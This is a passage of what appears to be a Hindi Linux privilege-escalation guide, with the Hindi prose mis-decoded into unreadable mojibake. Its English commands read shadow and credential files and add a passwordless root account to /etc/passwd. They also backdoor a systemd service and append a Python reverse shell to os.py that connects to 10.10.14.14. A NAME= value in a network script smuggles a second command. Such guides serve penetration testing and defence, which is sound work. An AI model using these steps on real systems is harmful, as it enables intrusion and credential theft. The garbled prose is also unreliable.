рдлрд╛рдЗрд▓ `/etc/profile` рдФрд░ `/etc/profile.d/` рдХреЗ рдЕрдВрддрд░реНрдЧрдд рдлрд╝рд╛рдЗрд▓реЗрдВ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИрдВ рдЬреЛ рддрдм рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдирдпрд╛ рд╢реЗрд▓ рдЪрд▓рд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЛ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
```bash
ls -l /etc/profile /etc/profile.d/
```
рдпрджрд┐ рдХреЛрдИ рдЕрдЬреАрдм рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдг** рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдПред

### рдкрд╛рд╕рд╡рд░реНрдб/рд╢реИрдбреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ

OS рдХреЗ рдЖрдзрд╛рд░ рдкрд░ `/etc/passwd` рдФрд░ `/etc/shadow` рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдХ рдЕрд▓рдЧ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдпрд╛ рдПрдХ рдмреИрдХрдЕрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЕрдиреБрд╢рдВрд╕рд┐рдд рд╣реИ рдХрд┐ **рдЗрдирдореЗрдВ рд╕реЗ рд╕рднреА рдХреЛ рдЦреЛрдЬреЗрдВ** рдФрд░ **рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдЗрдиреНрд╣реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ **рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрдВрджрд░ рд╣реИрд╢ рд╣реИрдВ**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
рдХреБрдЫ рдЕрд╡рд╕рд░реЛрдВ рдкрд░ рдЖрдк **password hashes** рдХреЛ `/etc/passwd` (рдпрд╛ рд╕рдордХрдХреНрд╖) рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

рдкрд╣рд▓реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
рдлрд┐рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `hacker` рдЬреЛрдбрд╝реЗрдВ рдФрд░ рдЙрддреНрдкрдиреНрди рдкрд╛рд╕рд╡рд░реНрдб рдЬреЛрдбрд╝реЗрдВред
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
рдЙрджрд╛рд╣рд░рдг: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

рдЖрдк рдЕрдм `su` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ `hacker:hacker` рдХреЗ рд╕рд╛рде рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рдЖрдк рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдПрдХ рдбрдореА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЪреЗрддрд╛рд╡рдиреА: рдЖрдк рдорд╢реАрди рдХреА рд╡рд░реНрддрдорд╛рди рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдХрдордЬреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: BSD рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдореЗрдВ `/etc/passwd` `/etc/pwd.db` рдФрд░ `/etc/master.passwd` рдкрд░ рд╕реНрдерд┐рдд рд╣реИ, рд╕рд╛рде рд╣реА `/etc/shadow` рдХрд╛ рдирд╛рдо рдмрджрд▓рдХрд░ `/etc/spwd.db` рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдЖрдк **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреНрдпрд╛ рдЖрдк рдХреБрдЫ **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдорд╢реАрди **tomcat** рд╕рд░реНрд╡рд░ рдЪрд▓рд╛ рд░рд╣реА рд╣реИ рдФрд░ рдЖрдк **/etc/systemd/ рдХреЗ рдЕрдВрджрд░ Tomcat рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ,** рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
рдЖрдкрдХрд╛ рдмреИрдХрдбреЛрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдЬрдм рдЯреЙрдордХреИрдЯ рд╢реБрд░реВ рд╣реЛрдЧрд╛, рддрдм рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред

### рдлрд╝реЛрд▓реНрдбрд░ рдЬрд╛рдВрдЪреЗрдВ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝реЛрд▓реНрдбрд░ рдмреИрдХрдЕрдк рдпрд╛ рджрд┐рд▓рдЪрд╕реНрдк рдЬрд╛рдирдХрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (рд╕рдВрднрд╡рддрдГ рдЖрдк рдЕрдВрддрд┐рдо рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдкрдврд╝рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реЛрдВрдЧреЗ рд▓реЗрдХрд┐рди рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### рдЕрдЬреАрдм рд╕реНрдерд╛рди/рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### рдЕрдВрддрд┐рдо рдорд┐рдирдЯреЛрдВ рдореЗрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### рдЫрд┐рдкреА рд╣реБрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **рд╕реНрдХреНрд░рд┐рдкреНрдЯ/рдмрд╛рдЗрдирд░реАрдЬрд╝ PATH рдореЗрдВ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **рд╡реЗрдм рдлрд╝рд╛рдЗрд▓реЗрдВ**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **рдмреИрдХрдЕрдк**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), рдпрд╣ **рдХрдИ рд╕рдВрднрд╛рд╡рд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
**рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг** рдЬрд┐рд╕рдХрд╛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) рдЬреЛ рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Windows, Linux рдФрд░ Mac рдкрд░ рд╕реНрдерд╛рдиреАрдп рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрдИ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### Logs

рдпрджрд┐ рдЖрдк рд▓реЙрдЧ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдЙрдирдореЗрдВ рджрд┐рд▓рдЪрд╕реНрдк/рдЧреЛрдкрдиреАрдп рдЬрд╛рдирдХрд╛рд░реА** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЙрдЧ рдЬрд┐рддрдирд╛ рдЕрдЬреАрдм рд╣реЛрдЧрд╛, рдпрд╣ рдЙрддрдирд╛ рд╣реА рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрдЧрд╛ (рд╕рдВрднрд╡рддрдГ)ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ "**рдЦрд░рд╛рдм**" рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП (рдмреИрдХрдбреЛрд░?) **рдСрдбрд┐рдЯ рд▓реЙрдЧ** рдЖрдкрдХреЛ **рдСрдбрд┐рдЯ рд▓реЙрдЧ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд░рд┐рдХреЙрд░реНрдб рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**рд▓реЙрдЧ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдореВрд╣** [**adm**](interesting-groups-linux-pe/#adm-group) рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрдЧрд╛ред

### рд╢реЗрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

рдЖрдкрдХреЛ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЬрд╛рдВрдЪ рднреА рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рдирдореЗрдВ "**password**" рд╢рдмреНрдж рдЙрдирдХреЗ **рдирд╛рдо** рдореЗрдВ рдпрд╛ **рд╕рд╛рдордЧреНрд░реА** рдХреЗ рдЕрдВрджрд░ рд╣реИ, рдФрд░ рд╕рд╛рде рд╣реА рд▓реЙрдЧ рдХреЗ рдЕрдВрджрд░ IPs рдФрд░ рдИрдореЗрд▓ рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП, рдпрд╛ рд╣реИрд╢ regexpsред\
рдореИрдВ рдпрд╣рд╛рдБ рдпрд╣ рдирд╣реАрдВ рдмрддрд╛рдиреЗ рдЬрд╛ рд░рд╣рд╛ рдХрд┐ рдпрд╣ рд╕рдм рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд░реБрдЪрд┐ рд░рдЦрддреЗ рд╣реИрдВ рддреЛ рдЖрдк [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдЕрдВрддрд┐рдо рдЪреЗрдХ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

## Writable files

### Python library hijacking

рдпрджрд┐ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ **рдХрд╣рд╛рдБ** рдПрдХ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣реА рд╣реИ рдФрд░ рдЖрдк рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ **рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдЖрдк **рдкрд╛рдпрдерди рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк OS рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдмреИрдХрдбреЛрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдЖрдк рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣реА рд╣реИ, рддреЛ os.py рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдХреЙрдкреА рдФрд░ рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ)ред

**рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдмреИрдХрдбреЛрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдмрд╕ os.py рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдЕрдВрдд рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрдВрдХреНрддрд┐ рдЬреЛрдбрд╝реЗрдВ (IP рдФрд░ PORT рдмрджрд▓реЗрдВ):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` рдореЗрдВ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓** рдпрд╛ рдЗрд╕рдХреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдкрд░ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЗ рд╕рд╛рде рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдмрдврд╝реА рд╣реБрдИ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ `logrotate`, рдЬреЛ рдЕрдХреНрд╕рд░ **root** рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рддрд╛ рд╣реИ, рдХреЛ рдордирдорд╛рдиреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрд░рдлреЗрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ _**/etc/bash\_completion.d/**_ рдЬреИрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ _/var/log_ рдореЗрдВ рд╣реА рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ рдХрд┐рд╕реА рднреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдЬрд╣рд╛рдВ рд▓реЙрдЧ рд░реЛрдЯреЗрд╢рди рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рдПред

{% hint style="info" %}
рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА `logrotate` рд╕рдВрд╕реНрдХрд░рдг `3.18.0` рдФрд░ рдкреБрд░рд╛рдиреЗ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИ
{% endhint %}

рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддреГрдд рдЬрд╛рдирдХрд╛рд░реА рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

рдЖрдк рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА рдХрд╛ рд▓рд╛рдн [**logrotten**](https://github.com/whotwagner/logrotten) рдХреЗ рд╕рд╛рде рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx рд▓реЙрдЧ),** рдХреЗ рд╕рдорд╛рди рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЬрдм рднреА рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЙрди рд▓реЙрдЧ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХреМрди рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рд▓реЙрдЧ рдХреЛ рд╕рд┐рдореНрд▓рд┐рдВрдХреНрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**рд╕реБрд░рдХреНрд╖рд╛ рдХрдореА рд╕рдВрджрд░реНрдн:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

рдпрджрд┐, рдХрд┐рд╕реА рднреА рдХрд╛рд░рдг рд╕реЗ, рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ _/etc/sysconfig/network-scripts_ рдореЗрдВ **рд▓реЗрдЦрди** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ `ifcf-<whatever>` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдпрд╛ рдЗрд╕реЗ **рд╕рдорд╛рдпреЛрдЬрд┐рдд** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХрд╛ **рд╕рд┐рд╕реНрдЯрдо рдкреНрд╡рдВрдб рд╣реИ**ред

рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ, _ifcg-eth0_ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИрдВред рд╡реЗ рдареАрдХ .INI рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рддрд░рд╣ рджрд┐рдЦрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЙрдиреНрд╣реЗрдВ Linux рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрдХ (dispatcher.d) рджреНрд╡рд╛рд░рд╛ \~sourced\~ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдореЗрд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрди рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ `NAME=` рдХреЛ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рд╕рдВрднрд╛рд▓рд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдирд╛рдо рдореЗрдВ **рд╕рдлреЗрдж/рдЦрд╛рд▓реА рд╕реНрдерд╛рди рд╣реИ рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕рдлреЗрдж/рдЦрд╛рд▓реА рд╕реНрдерд╛рди рдХреЗ рдмрд╛рдж рдХреЗ рднрд╛рдЧ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдкрд╣рд▓реЗ рд╕рдлреЗрдж рд╕реНрдерд╛рди рдХреЗ рдмрд╛рдж рд╕рдм рдХреБрдЫ root рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, рдФрд░ rc.d**

